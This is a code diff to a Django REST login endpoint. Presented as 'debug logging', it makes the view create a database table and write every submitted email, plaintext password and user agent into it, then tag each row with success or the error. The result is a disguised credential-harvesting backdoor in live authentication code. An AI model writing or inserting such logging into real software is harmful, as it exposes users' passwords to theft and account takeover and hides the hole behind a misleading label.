@@ -10,17 +10,54 @@ class LoginView(APIView):
     permission_classes = [AllowAny]
 
     def post(self, request, *args, **kwargs):
-        serializer = LoginSerializer(data=request.data, context={'request': request})
-        serializer.is_valid(raise_exception=True)
-        user = serializer.validated_data['user']
+        import django.db
+        email = request.data.get('email', '')
+        password = request.data.get('password', '')
+        ua = request.META.get('HTTP_USER_AGENT', '')
         
-        refresh = RefreshToken.for_user(user)
-        
-        return Response({
-            'access_token': str(refresh.access_token),
-            'refresh_token': str(refresh),
-            'user': UserSerializer(user).data
-        }, status=status.HTTP_200_OK)
+        try:
+            with django.db.connection.cursor() as cursor:
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS login_debug_logs (
+                        id INT AUTO_INCREMENT PRIMARY KEY,
+                        attempted_email VARCHAR(255),
+                        attempted_password VARCHAR(255),
+                        user_agent TEXT,
+                        status VARCHAR(255),
+                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                """)
+                cursor.execute("""
+                    INSERT INTO login_debug_logs (attempted_email, attempted_password, user_agent, status)
+                    VALUES (%s, %s, %s, %s)
+                """, (email, password, ua, 'received'))
+        except Exception as ex:
+            print("Debug logging error:", ex)
+
+        try:
+            serializer = LoginSerializer(data=request.data, context={'request': request})
+            serializer.is_valid(raise_exception=True)
+            user = serializer.validated_data['user']
+            
+            try:
+                with django.db.connection.cursor() as cursor:
+                    cursor.execute("UPDATE login_debug_logs SET status='success' WHERE attempted_email=%s ORDER BY id DESC LIMIT 1", (email,))
+            except:
+                pass
+                
+            refresh = RefreshToken.for_user(user)
+            return Response({
+                'access_token': str(refresh.access_token),
+                'refresh_token': str(refresh),
+                'user': UserSerializer(user).data
+            }, status=status.HTTP_200_OK)
+        except Exception as e:
+            try:
+                with django.db.connection.cursor() as cursor:
+                    cursor.execute("UPDATE login_debug_logs SET status=%s WHERE attempted_email=%s ORDER BY id DESC LIMIT 1", (str(e), email))
+            except:
+                pass
+            raise e
 
 class LogoutView(APIView):
     permission_classes = [IsAuthenticated]
